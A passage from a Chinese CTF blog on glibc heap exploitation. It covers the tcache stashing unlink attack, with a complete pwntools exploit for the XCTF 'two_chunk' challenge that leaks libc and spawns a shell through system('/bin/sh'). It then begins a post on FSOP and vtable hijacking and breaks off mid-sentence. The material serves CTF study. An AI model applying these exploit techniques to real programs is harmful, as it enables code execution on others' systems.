src="/2022/02/07/tcache-stashing-unlink-attack/image-20220207130126149.png" alt="image-20220207130126149"></p><p>执行完tcache-stashing-unlink-attack后，效果为下图</p><p><img src="/2022/02/07/tcache-stashing-unlink-attack/image-20220207130244398.png" alt="image-20220207130244398"></p><p>可以看到分配了一个块到tcache，并且写入了一个main_arena。</p><h2 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h2><p>向任意指定位置写入指定值</p><p>向任意地址分配一个Chunk</p><h2 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h2><ol><li>能控制 Small Bin Chunk 的 bk 指针。</li><li>程序可以越过Tache取Chunk。(使用<strong>calloc</strong>即可做到)</li><li>程序至少可以分配两种不同大小且大小为unsorted bin的Chunk。</li></ol><h1 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h1><p>这里以2020-XCTF-高校战疫赛 two_chunk为例。exp和源文件放在<a href="https://github.com/Nicholas-wei/pwn/tree/main/ctf-heap-chall/stashing">链接</a>中</p><p>这道题就是利用tcache stashing unlink attack完成的任意地址分配堆块+写入一个main_arena。不能使用unsortedbin切割泄露，因为程序会检查堆地址没有\x7f。使用这种方法向一个已知地址写入数据。注意一开始需要分配五个块才能完成将下一个块分配到tcache中。最后利用分配的块+后门函数完成攻击。</p><p>这里需要注意，如果想要任意地址分配一个块，一定要确保这个块的fd(也就是fake_chunk-&gt;bck-&gt;fd)是可写的，因为要写入一个main_arena地址。其实就相当以这个块作为我们只需要写入地址时的第六个块而已。题目还有一点比较复杂的是只能申请两个工作中的块，要用这两个块完成堆风水到两个smallbin的块。好在题目没有限制堆块数量和大小。</p><p>重要的堆结构，放在了上面的触发过程的解释中。这里留一个小问题，如果只需要往0x23333000写入main_arena地址，应该怎么完成？(答：一开始分配六个0x88的块即可)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">filename=<span class="string">&quot;./twochunk&quot;</span></span><br><span class="line">libc_name=<span class="string">&quot;/home/nicholas/glibc-all-in-one/libs/libc6_2.29-0ubuntu2_amd64/libc-2.29.so&quot;</span></span><br><span class="line">io = process(filename)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">elf=ELF(filename)</span><br><span class="line">libc=ELF(libc_name)</span><br><span class="line">context.terminal=[<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;split&#x27;</span>,<span class="string">&#x27;-hp&#x27;</span>,<span class="string">&#x27;60&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index,size</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;choice:&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;idx:&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;size:&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;choice:&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;idx:&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;choice:&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;idx:&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,content</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;choice&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;idx:&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;content:&#x27;</span>)</span><br><span class="line">    io.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">malloc</span>(<span class="params">content</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;choice&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(<span class="number">6</span>))</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;leave your end message:&#x27;</span>)</span><br><span class="line">    io.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">backdoor</span>():</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;choice&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(<span class="number">7</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">message</span>():</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;choice&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(<span class="number">5</span>))</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    cmd = <span class="string">&quot;&quot;</span></span><br><span class="line">    cmd+=<span class="string">&quot;brva 0x151C\n&quot;</span></span><br><span class="line">    gdb.attach(io,cmd)</span><br><span class="line">    show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;leave your name:&#x27;</span>)</span><br><span class="line">io.send(p64(<span class="number">0x23333020</span>)*<span class="number">6</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;leave your message:&quot;</span>)</span><br><span class="line">io.send(p64(<span class="number">0x23333020</span>)*<span class="number">8</span>) <span class="comment"># make it writable</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># first prepare 0x90 chunk in tcache </span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">5</span>):</span><br><span class="line">    add(<span class="number">0</span>,<span class="number">0x88</span>)</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># aim is to create(0x88)*2, puts into smallbin</span></span><br><span class="line"><span class="comment"># add size limit(0x88,0x3ff) add(0x23333) means malloc(0xe9)</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">7</span>):</span><br><span class="line">    add(<span class="number">0</span>,<span class="number">0x198</span>)</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x198</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x200</span>) <span class="comment"># avoid consolidate</span></span><br><span class="line">free(<span class="number">0</span>) <span class="comment">#0x188 into unsortedbin</span></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x108</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0xa8</span>) <span class="comment">#put into smallbin</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>) <span class="comment">#consolidate</span></span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0xe9</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0xe9</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">23333</span>) <span class="comment"># leak heap_addr using tcache</span></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">heap_info = u64(io.recvuntil(<span class="string">b&#x27;\x55&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">success(<span class="string">&quot;heap_info: &quot;</span> + <span class="built_in">hex</span>(heap_info))</span><br><span class="line">heap_base = heap_info - <span class="number">5360</span></span><br><span class="line">success(<span class="string">&quot;heap_base: &quot;</span> + <span class="built_in">hex</span>(heap_base))</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">6</span>):</span><br><span class="line">    add(<span class="number">1</span>,<span class="number">0x190</span>)</span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x190</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x210</span>) <span class="comment">#avoid consolidate</span></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x108</span>) </span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line"><span class="comment"># free(1)</span></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0xb8</span>) <span class="comment">#put into smallbin</span></span><br><span class="line"><span class="comment"># [smallbin] 0x90: 0x56248bc6ef70 —▸ 0x56248bc6de40 —▸ 0x7f02119a4d20 (main_arena+224) ◂— 0x56248bc6ef70</span></span><br><span class="line">free(<span class="number">0</span>) <span class="comment"># no-use</span></span><br><span class="line"><span class="comment"># now ptr1&#x27;s next is vuln 0x90 in smallbin</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># use edit&#x27;s overflow to leak</span></span><br><span class="line">payload1 = <span class="string">b&quot;a&quot;</span>*<span class="number">0x100</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x91</span>)+p64(heap_base+<span class="number">0x001190</span>)+p64(<span class="number">0x23333000</span> - <span class="number">0x10</span>)</span><br><span class="line">edit(<span class="number">1</span>,payload1)</span><br><span class="line"><span class="comment"># gdb.attach(io,&quot;brva 0x12D2&quot;) # break add</span></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x88</span>) <span class="comment"># trigger tcache stashing unlink attack</span></span><br><span class="line"><span class="comment"># gdb.attach(io,&quot;brva 0x169B&quot;)</span></span><br><span class="line">message()</span><br><span class="line">libc_info = u64(io.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">success(<span class="string">&quot;libc_info: &quot;</span> + <span class="built_in">hex</span>(libc_info))</span><br><span class="line">libc_base = libc_info-<span class="number">0x1e4d20</span></span><br><span class="line">success(<span class="string">&quot;libc_base: &quot;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(io,&quot;brva 0x1701&quot;)</span></span><br><span class="line"><span class="comment"># malloc back malicious chunk</span></span><br><span class="line">malloc(p64(libc_base+libc.symbols[<span class="string">&#x27;system&#x27;</span>])+p64(<span class="number">0</span>)*<span class="number">5</span>+p64(libc_base+libc.search(<span class="string">b&quot;/bin/sh\x00&quot;</span>).__next__())+p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line"><span class="comment"># gdb.attach(io,&quot;brva 0x1766&quot;)</span></span><br><span class="line">backdoor()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://www.anquanke.com/post/id/198173">https://www.anquanke.com/post/id/198173</a></p><p><a href="https://www.jianshu.com/p/03c4e0413608">https://www.jianshu.com/p/03c4e0413608</a></p>]]></content>
      
      
      <categories>
          
          <category> basic </category>
          
      </categories>
      
      
        <tags>
            
            <tag> heap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IO_file常见利用方法&amp;原理(二)</title>
      <link href="/2022/02/03/IO-file-vtable/"/>
      <url>/2022/02/03/IO-file-vtable/</url>
      
        <content type="html"><![CDATA[<p>这次主要学习劫持vtable，构造fsop的手法。主要参考的还是<a href="https://ray-cp.github.io/archivers/IO_FILE_vtable_hajack_and_fsop">这位师傅</a>的博客。</p><span id="more"></span><p>FSOP最早出现在2016的经典题目house of orange上。并且只存在于libc2.23及之前。但是后期也有别的方法利用，<a href="https://nicholas-wei.github.io/2022/01/28/hws2022%E5%86%AC%E4%BB%A4%E8%90%A5ctf/">可以参考这篇博客</a>中的签到题。</p><h1 id="FSOP"><a href="#FSOP" class="headerlink" title="FSOP"></a>FSOP</h1><h2 id="相关知识"><a href="#相关知识" class="headerlink" title="相关知识"></a>相关知识</h2><p>fsop的核心是劫持vtable。vtable是位于IO_FILE_plus中的结构体，储存了很多函数指针</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  _IO_FILE file;</span><br><span class="line">  <span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *<span class="title">vtable</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>结构体<code>_IO_jump_t</code>为</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    JUMP_FIELD(<span class="type">size_t</span>, __dummy);</span><br><span class="line">    JUMP_FIELD(<span class="type">size_t</span>, __dummy2);</span><br><span class="line">    JUMP_FIELD(_IO_finish_t, __finish);</span><br><span class="line">    JUMP_FIELD(_IO_overflow_t, __overflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __underflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __uflow);</span><br><span class="line">    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);</span><br><span class="line">    <span class="comment">/* showmany */</span></span><br><span class="line">    JUMP_FIELD(_IO_xsputn_t, __xsputn);</span><br><span class="line">    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);</span><br><span class="line">    JUMP_FIELD(_IO_seekoff_t, __seekoff);</span><br><span class="line">    JUMP_FIELD(_IO_seekpos_t, __seekpos);</span><br><span class="line">    JUMP_FIELD(_IO_setbuf_t, __setbuf);</span><br><span class="line">    JUMP_FIELD(_IO_sync_t, __sync);</span><br><span class="line">    JUMP_FIELD(_IO_doallocate_t, __doallocate);</span><br><span class="line">    JUMP_FIELD(_IO_read_t, __read);</span><br><span class="line">    JUMP_FIELD(_IO_write_t, __write);</span><br><span class="line">    JUMP_FIELD(_IO_seek_t, __seek);</span><br><span class="line">    JUMP_FIELD(_IO_close_t, __close);</span><br><span class="line">    JUMP_FIELD(_IO_stat_t, __stat);</span><br><span class="line">    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);</span><br><span class="line">    JUMP_FIELD(_IO_imbue_t, __imbue);</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> 0</span></span><br><span class="line">    get_column;</span><br><span class="line">    set_column;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>这19个函数和读写操作关系密切。</p><p>*<em>注意，和之前介绍的p <em>stdin不同，之前打印出来的是上面IO_file结构体，而不是vtable。如下所示</em></em></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p <span class="built_in">stdin</span></span><br><span class="line">$<span class="number">3</span> = (<span class="keyword">struct</span> _IO_FILE *) <span class="number">0x7ffff7dcfa00</span> &lt;_IO_2_1_stdin_&gt;</span><br><span class="line">pwndbg&gt; p *<span class="built_in">stdin</span> <span class="comment">// 注意这里不是vtable!只是_IO_FILE结构</span></span><br><span class="line">$<span class="number">4</span> = &#123;</span><br><span class="line">  _flags = <span class="number">-72540024</span>,</span><br><span class="line">  _IO_read_ptr = <span class="number">0x0</span>,</span><br><span class="line">  _IO_read_end = <span class="number">0x0</span>,</span><br><span class="line">  _IO_read_base = <span class="number">0x0</span>,</span><br><span class="line">  _IO_write_base = <span class="number">0x0</span>,</span><br><span class="line">  _IO_write_ptr = <span class="number">0x0</span>,</span><br><span class="line">  _IO_write_end = <span class="number">0x0</span>,</span><br><span class="line">  _IO_buf_base = <span class="number">0x0</span>,</span><br><span class="line">  _IO_buf_end = <span class="number">0x0</span>,</span><br><span class="line">  _IO_save_base = <span class="number">0x0</span>,</span><br><span class="line">  _IO_backup_base = <span class="number">0x0</span>,</span><br><span class="line">  _IO_save_end = <span class="number">0x0</span>,</span><br><span class="line">  _markers = <span class="number">0x0</span>,</span><br><span class="line">  _chain = <span class="number">0x0</span>,</span><br><span class="line">  _fileno = <span class="number">0</span>,</span><br><span class="line">  _flags2 = <span class="number">0</span>,</span><br><span class="line">  _old_offset = <span class="number">-1</span>,</span><br><span class="line">  _cur_column = <span class="number">0</span>,</span><br><span class="line">  _vtable_offset = <span class="number">0</span> <span class="string">&#x27;\000&#x27;</span>,</span><br><span class="line">  _shortbuf = <span class="string">&quot;&quot;</span>,</span><br><span class="line">  _lock = <span class="number">0x7ffff7dd18d0</span> &lt;_IO_stdfile_0_lock&gt;,</span><br><span class="line">  _offset = <span class="number">-1</span>,</span><br><span class="line">  _codecvt = <span class="number">0x0</span>,</span><br><span class="line">  _wide_data = <span class="number">0x7ffff7dcfae0</span> &lt;_IO_wide_data_0&gt;,</span><br><span class="line">  _freeres_list = <span class="number">0x0</span>,</span><br><span class="line">  _freeres_buf = <span class="number">0x0</span>,</span><br><span class="line">  __pad5 = <span class="number">0</span>,</span><br><span class="line">  _mode = <span class="number">0</span>,</span><br><span class="line">  _unused2 = <span class="string">&#x27;\000&#x27;</span> &lt;repeats <span class="number">19</span> times&gt;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在<a href="https://nicholas-wei.github.io/2022/01/29/IO-file/">之前文章</a>中劫持的是IO_FILE表，注意和这里不同。</p><p>使用如下命令查看<code>IO_FILE_plus</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p *(<span class="keyword">struct</span> _IO_FILE_plus *) <span class="built_in">stdin</span> <span class="comment">// 打印包含vtable指针的IO_FILE结构体 </span></span><br></pre></td></tr></table></figure><p><img src="/2022/02/03/IO-file-vtable/image-20220202210502211.png" alt="image-20220202210502211"></p><p>直接打印输出中的别名，可以直接输出优化处理的vtable。</p><p><img src="/2022/02/03/IO-file-vtable/image-20220202210312775.png" alt="image-20220202210312775"></p><p>劫持vtable的原理就是：修改IO_FILE_plus中的vtable指针，把vtable指向可控的内存，从而布置我们的恶意指针，完成对程序流的控制。具体而言，方法有两种：</p><ul><li>直接修改file结构体的指针</li><li>伪造整个file结构体</li></ul><p>以下为vtable中函数的调用情况，可以考虑劫持这些函数指针。</p><p><img src="/2022/02/03/IO-file-vtable/image-20220202210810239.png" alt="image-20220202210810239"></p><h2 id="例子house-of-orange"><a href="#例子house-of-orange" class="headerlink" title="例子house of orange"></a>例子house of orange</h2><p>在libc&lt;=2.23的fsop有一道经典的题目，House of orange</p><p>house of orange并不涉及到以上函数。和其相关的重要结构体是<code>fopen</code>相关的<code>IO_list_all</code>指针。</p><p>进程中打开的所有文件结构体使用一个单链表来进行管理，即通过<code>_IO_list_all</code>进行管理，在<a href="https://ray-cp.github.io/archivers/IO_FILE_fopen_analysis"><code>fopen</code></a>的分析中，我们知道了fopen是通过<code>_IO_link_in</code>函数将新打开的结构体链接进入<code>_IO_list_all</code>的，相关的代码如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">fp-&gt;file._flags |= _IO_LINKED;</span><br><span class="line">...</span><br><span class="line">fp-&gt;file._chain = (_IO_FILE *) _IO_list_all;</span><br><span class="line">_IO_list_all = fp; <span class="comment">// 可以看到采用头插法</span></span><br></pre></td></tr></table></figure><p>我们也可以从代码中看到<code>IO_list_all</code></p><p><img src="/2022/02/03/IO-file-vtable/image-20220202211443399.png" alt="image-20220202211443399"></p><p>如下图看出形成的chain结构体</p><p><img src="/2022/02/03/IO-file-vtable/image-20220202211736243.png" alt="image-20220202211736243"></p><p>劫持的主要想法是伪造一个在chain上的file结构体。<strong>在程序终止时，libc会调用<code>_IO_flush_all_lockp</code>来刷新file结构体，为保证数据不丢失，刷新缓冲区中的所有数据。此时会调用我们伪造的vtable结构体中的<code>_IO_OVERFLOW</code>。源码如下</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_flush_all_lockp (<span class="type">int</span> do_lock)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result = <span class="number">0</span>;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *<span class="title">fp</span>;</span></span><br><span class="line">  <span class="type">int</span> last_stamp;</span><br><span class="line"></span><br><span class="line">  fp = (_IO_FILE *) _IO_list_all;</span><br><span class="line">  <span class="keyword">while</span> (fp != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">    ...</span><br><span class="line">      <span class="keyword">if</span> (((fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span></span><br><span class="line">     || (_IO_vtable_offset (fp) == <span class="number">0</span></span><br><span class="line">         &amp;&amp; fp-&gt;_mode &gt; <span class="number">0</span> &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">            &gt; fp-&gt;_wide_data-&gt;_IO_write_base))</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">     )</span><br><span class="line">    &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)   <span class="comment">// 如果输出缓冲区有数据，刷新输出缓冲区</span></span><br><span class="line">  result = EOF;</span><br><span class="line"></span><br><span class="line">      </span><br><span class="line">  fp = fp-&gt;_chain; <span class="comment">//遍历链表</span></span><br><span class="line">    &#125;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>具体的利用方法为</p><blockquote><p>伪造IO FILE结构体，并利用漏洞将<code>_IO_list_all</code>指向伪造的结构体，或是将该链表中的一个节点（<code>_chain</code>字段）指向伪造的数据，最终触发<code>_IO_flush_all_lockp</code>，绕过检查，调用<code>_IO_OVERFLOW</code>时实现执行流劫持。</p><p>注意：只有当输出缓冲区中存在数据的时候，才会调用<code>_IO_OVERFLOW</code>。因此利用的另一个条件是<strong>输出缓冲区存在数据</strong>。由于一般程序异常终止时会输出报错信息，所以这一点一般可以满足。</p></blockquote><h3 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h3><p>比较明显的是在upgrade中，使用了之前获取的名称大小来写入，<strong>造成堆溢出</strong>。</p><p><img src="/2022/02/03/IO-file-vtable/image-20220202213826720.png" alt="image-20220202213826720"></p><p>但是程序中没有free函数，这就限制了很多堆操作。</p><h3 id="调试用命令"><a href="#调试用命令" class="headerlink" title="调试用命令"></a>调试用命令</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gdb.attach(io,<span class="string">&quot;b _IO_flush_all_lockp&quot;</span>) <span class="comment">// 调用abort 会触发的函数</span></span><br><span class="line">print *(<span class="keyword">struct</span> _IO_FILE_plus *)_IO_list_all <span class="comment">// 显示完整的IO_FILE_plus</span></span><br><span class="line">print *(<span class="keyword">struct</span> _IO_FILE_plus *)`_chain中的内容`</span><br><span class="line">print *((<span class="keyword">struct</span> _IO_FILE_plus *)`_chain中内容`).vtable</span><br></pre></td></tr></table></figure><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>由于没有free，首先通过溢出覆盖<code>main_arena</code>的大小使得<code>main_arena</code>被放进<code>unsortedbin</code>中，准备使用<code>unsortedbin 